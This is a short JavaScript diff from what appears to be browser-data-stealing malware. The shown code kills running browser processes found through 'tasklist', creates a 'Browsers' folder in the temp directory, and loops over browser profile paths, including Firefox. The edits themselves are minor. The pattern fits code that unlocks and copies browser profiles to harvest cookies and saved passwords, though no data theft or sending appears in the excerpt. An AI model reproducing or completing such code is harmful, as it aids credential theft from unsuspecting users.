@@ -104,7 +104,7 @@ const chrome = {
 
 const kill = (processes) => {
   return new Promise((resolve) => {
-    const tasks = execSync('tasklist').toString().split('\n');
+    const tasks = execSync('tasklist').toString();
     let i = 0;
     processes = processes.filter(task => tasks.includes(task));
     processes.forEach((task, index) => {
@@ -116,7 +116,7 @@ const kill = (processes) => {
 
 if (!existsSync(join(getTempFolder(), 'Browsers'))) mkdirSync(join(getTempFolder(), 'Browsers'));
 kill(browsersProcesses).then(() => {
-  Object.keys(browsers).forEach(async (browser) => {
+  Object.keys(browsers).forEach((browser) => {
     const path = browsers[browser];
     const isFirefox = browser === 'Firefox';
     if (isFirefox && !existsSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox')))
